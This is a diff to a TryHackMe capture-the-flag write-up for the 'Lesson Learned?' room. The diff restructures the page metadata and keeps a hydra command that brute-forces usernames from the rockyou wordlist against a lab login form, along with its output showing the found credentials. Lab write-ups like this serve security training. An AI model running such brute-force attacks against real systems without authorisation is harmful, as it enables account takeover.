@@ -1,19 +1,14 @@
 ---
-title: Lesson Learned? - TryHackMe
+clayout: ctf
+title: Lesson Learned?
+type: TryHackMe
 date: 2025-02-05
+level: Easy
+icon: /ctf/tryhackme/lesson-learned/icon-room.png
+image: /ctf/tryhackme/lesson-learned/icon-room.png
+description: Have you learned your lesson?
+ctf-link: https://tryhackme.com/room/lessonlearned
 ---
-
-<script setup>
-    import RoomCard from "../../../.vitepress/components/thm/RoomCard.vue";
-</script>
-
-<RoomCard
-    roomName="Lesson Learned?"
-    roomIcon="/ctf/tryhackme/lesson-learned/icon-room.png"
-    roomLink="https://tryhackme.com/room/lessonlearned"
-    roomLevel="EASY"
-    roomTechnology="Linux"
-/>
 
 ## Challenge Overview
 
@@ -43,12 +38,7 @@ However, **by mistake**, we use the **RockYou wordlist** for usernames instead o
 
 ```bash
 hydra -L /usr/share/wordlists/rockyou.txt -p password -s 80 -f 10.10.229.198 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."
-```
-
-Yes we use the **rockyou.txt** wordlist for **usernames** (it's a mistake, but it works). Finally, we find a valid
-username:
-
-```bash
+...
 [80][http-post-form] host: 10.10.229.198   login: patrick   password: password
 ```
 
